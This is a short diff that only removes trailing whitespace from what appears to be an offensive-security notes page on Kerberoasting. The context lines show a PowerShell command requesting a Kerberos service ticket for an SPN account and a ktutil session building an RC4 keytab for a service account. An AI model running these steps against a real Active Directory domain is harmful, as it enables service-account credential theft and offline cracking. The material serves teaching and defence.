@@ -58,7 +58,7 @@ Attacker requesting a kerberos ticket (TGS) for a user account with `servicePrin
 
 {% code title="attacker@victim" %}
 ```csharp
-Add-Type -AssemblyName System.IdentityModel  
+Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
 ```
 {% endcode %}
@@ -121,9 +121,9 @@ Creating a kerberos keytab file for use in wireshark:
 
 {% code title="attacker@local" %}
 ```bash
-root@~# ktutil 
+root@~# ktutil
 ktutil:  add_entry -password -p HTTP/iis_svc@dc-mantvydas.offense.local -k 1 -e arcfour-hmac-md5
-Password for HTTP/iis_svc@dc-mantvydas.offense.local: 
+Password for HTTP/iis_svc@dc-mantvydas.offense.local:
 ktutil:  wkt /root/tools/iis.keytab
 ```
 {% endcode %}
